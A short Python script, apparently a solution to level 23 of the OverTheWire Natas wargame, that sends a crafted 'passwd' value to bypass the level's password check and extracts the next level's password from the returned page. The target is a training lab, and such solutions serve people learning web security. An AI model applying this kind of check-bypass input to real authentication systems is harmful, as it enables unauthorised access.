import subprocess
import re
import requests
from requests.auth import HTTPBasicAuth

def inject_payload():
    #Username and Password for natas website/level
    passw = subprocess.run(['getpass', '23'], stdout=subprocess.PIPE).stdout.decode('utf-8')
    auth = HTTPBasicAuth('natas23', passw.strip())
    payload={'passwd':'11iloveyou'}
    #Get request to website, creates object that contains a .text property
    #text property holds the html of the webpage
    r = requests.get('http://natas23.natas.labs.overthewire.org/', auth=auth, params=payload)
    passreg = '[a-zA-Z0-9]{32}'
    print(re.findall(passreg, r.text)[1])

if __name__ == "__main__":
    inject_payload()